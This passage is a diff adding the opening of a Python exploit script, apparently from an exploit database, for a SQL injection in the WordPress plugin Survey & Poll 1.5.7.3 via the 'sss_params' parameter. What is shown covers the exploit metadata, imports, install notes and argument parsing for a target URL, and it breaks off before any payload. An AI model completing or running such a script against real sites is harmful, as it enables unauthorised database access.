@@ -1,0 +1,43 @@
+# Exploit Title: WordPress Plugin Survey & Poll 1.5.7.3 - 'sss_params' SQL Injection (2)
+# Date: 2021-09-07
+# Exploit Author: Mohin Paramasivam (Shad0wQu35t)
+# Vendor Homepage: http://modalsurvey.pantherius.com/
+# Software Link: https://downloads.wordpress.org/plugin/wp-survey-and-poll.zip
+# Version: 1.5.7.3
+# Tested on: MariaDB,MYSQL
+
+#!/usr/bin/python3
+
+import requests
+import re
+import warnings
+from bs4 import BeautifulSoup, CData
+import sys
+import argparse
+import os
+import time
+from termcolor import colored
+import validators
+
+#Install all the requirements
+
+'''
+pip3 install requests
+pip3 install bs4
+pip3 install argparse
+pip3 install termcolor
+pip3 install validators
+
+'''
+
+
+parser = argparse.ArgumentParser(description='WP Plugin Survey & Poll V1.5.7.3 SQL Injection (sss_params)')
+parser.add_argument('-u',help='Poll & Survey page URL')
+args = parser.parse_args()
+
+url = args.u
+
+
+if len(sys.argv) !=3:
+    parser.print_help(sys.stderr)
+    sys.ex
